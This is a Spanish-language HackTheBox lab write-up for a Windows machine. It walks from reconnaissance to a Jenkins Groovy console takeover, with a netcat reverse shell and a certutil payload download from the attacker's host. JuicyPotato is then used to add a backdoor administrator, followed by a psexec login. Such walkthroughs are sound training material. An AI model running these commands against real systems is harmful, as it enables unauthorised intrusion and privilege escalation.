
-- -
 - Tags: #HTB #Medium #windows 
---
#### QUÉ SE EXPLOTA?

Jenkins Exploitation (Groovy Script Console)
RottenPotato (SeImpersonatePrivilege)
PassTheHash (Psexec)
Breaking KeePass
Alternate Data Streams (ADS)


#### WRITE UP

##### PRIMERA FASE: Reconocimiento

Como ya es costumbre vamos a empezar lanzando un escaneo **ICMP** Vamos a lanzar un **ping** para descubrir si la maquina está activa y para determinar el sistema operativo. 

![](../imgs/Pasted image 20251211153926.png)
Determinamos que estamos ante un **SO** windows. 

Primeramente haremos un **escaneo SYN scan. El objetivo de este escaneo** es determinar todos los puertos abiertos. 

```bash
sudo nmap -sS -p- --open --min-rate 5500 -n -Pn 10.10.10.10 -vv -oG GenPort_scan
```

Mientras esperabamos con **whatweb** empezamos a recopilar mayor información sobre el puerto **80** ya que habíamos visto con el verbose que estaba disponible. 

![](../imgs/Pasted image 20251211154922.png)

Únicamente encontramos que estamos ante un **[[IIS]] v. 10** posteriormente haremos la inspección de la web. 

Una vez que el escaneo se completo **pasamos a la segunda fase del escaneo** para este escaneo **Utilizaremos todos los scripts por defecto de nmap así como el de versiones** esto con el objetivo de obtener mayores detalles sobre dichos puertos. 

![](../imgs/Pasted image 20251211155129.png)
Obtuvimos unos cuantos puertos interesantes. **El puerto 80,445,50000**
 
Proseguimos a utilizar **[[smbclient]]** y **[[crackmapexec]]** para inspeccionar un poco más a fondo de lo 

![](../imgs/Pasted image 20251211162225.png)

Necesitamos credenciales para validarnos, y además vimos que estamos ante un **Windows 10.**

Proseguimos a inspeccionar la web.  En el puerto **80** No encontramos nada de utilidad den la página web, por lo que proseguimos a inspeccionar el puerto **50000** ya que también estaba sirviendo un servicio **http**. 

![](../imgs/Pasted image 20251211171349.png)

![](../imgs/Pasted image 20251211171834.png)

![](../imgs/Pasted image 20251211171847.png)

En el puerto **50000** nos marca **error 404** como si nu hubiese nada, sin embargo, el puerto está abierto y corriendo un servicio **http*** no nos marca **403/Forbidden** por lo que podemos asumir que a lo mejor hay una ruta que podemos descubrir. 

**Para eso intentamos con [[GoBuster]]** a ver si podemos encontrar algo. 

```bash

gobuster dir -w /usr/share/wordlists/Dirbuster/directory-list-2.3-medium.txt -u http://10.10.10.63 -t 250
```

No encontramos nada en el puerto **80** por lo que proseguimos ahora con el puerto **50000** 

![](../imgs/Pasted image 20251211184124.png)

encontramos una ruta. **/askjeeves**
Al ingresar a la ruta encontrada nos topamos con **Un  servidor [[Jenkins]]** 
![](../imgs/Pasted image 20251211184336.png)

Además de eso, estaba disponible la ruta **/script** que nos permite ejecutar comandos a través de un script **groovy** 

![](../imgs/Pasted image 20251211191926.png)
##### SEGUNDA FASE: Explotación

Confirmando la existencia de la **consola de scripts de [[Jenkins]]** vemos si tenemos ejecución remota de comandos. 

```groovy
println "whoami".execute().text
```

![](../imgs/Pasted image 20251211192000.png)

Primeramente localizamos algún binario de **netcat**

```bash
locate nc.exe
```

Lo copiamos en nuestra ruta de trabajo que posteriormente compartiremos con **impacket** para poder compartir recursos en red **[[SMB]]**

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Desde el **script manager de [[Jenkins]]** ejecutamos el **nc.exe** localizado en nuestro recurso comartido. 

![](../imgs/Pasted image 20251212121427.png)

```groovy
println "\\\\10.10.16.4\\smbFolder\\nc.exe -e cmd 10.10.16.4 443".execute().text
```

**recordemos escapar los ' \\'**

![](../imgs/Pasted image 20251212121234.png)

Nos ponemos en escucha con **netcat** y recibimos la conexión. 

##### TERCERA FASE: Postexplotación - Privesc

Primeramente verificamos los perimsos que tenemos 

```cmd

whoami /priv
```

![](../imgs/Pasted image 20251212161503.png)

**Teniamos al [[SeImpersonatePrivilege]]*** por lo que proseguimos a jugar con **[[JuicyPotato]]** .

Primeramente tenemos que descargar el binario desde [Github](https://github.com/ohpe/juicy-potato) 

Lo compartimos desde nuestra máquina a la máquina victima

```bash
certutil.exe -f -urlcache -split http://10.10.16.4/juicipotatoes.exe jp.exe
```

```bash
impacket-smbserver smbFolder $(pwd) -smb2support
```

Lo ejecutamos en la máquina víctima. 

```bash

	jp.exe -t * -p c:\Windows\system32\cmd.exe -a "/c net user raiv4x test123$ /add" -l 2611 
```

**Esto creara un usuario**

Añadimos al usuario  al grupo de Administradores.

```cmd
jp.exe -t * -p c:\Windows\system32\cmd.exe -a "/c net localgroup Administrators raiv4x /add" -l 2611
```

Por último modificamos el **Token filter policy** 

```cmd
jp.exe -t * -p c:\Windows\system32\cmd.exe -a "/c reg add HKLM\Software\Microsoft\Windows\CurrentVersion\Policies\System /v LocalAccountTokenFilterPolicy /t REG_DWORD /d 1 /f" -l 2611
```

Listo, podemos verificar con **[[crackmapexec]]**

![](../imgs/Pasted image 20251213090556.png)

Finalmente después de haber **creado el usuario con privilegios y haber modificado las políticas de Token** usamos **impacket-psexec**.

```bash
impacket-psexec WORKGROUP/raiv4x@10.10.10.63 cmd.exe
```

![](../imgs/Pasted image 20251213091200.png)

Finalmente buscamos las banderas y listo.

```cmd

dir /s /r user.txt
```


**La bandera root está oculta en un [[ADS]]**






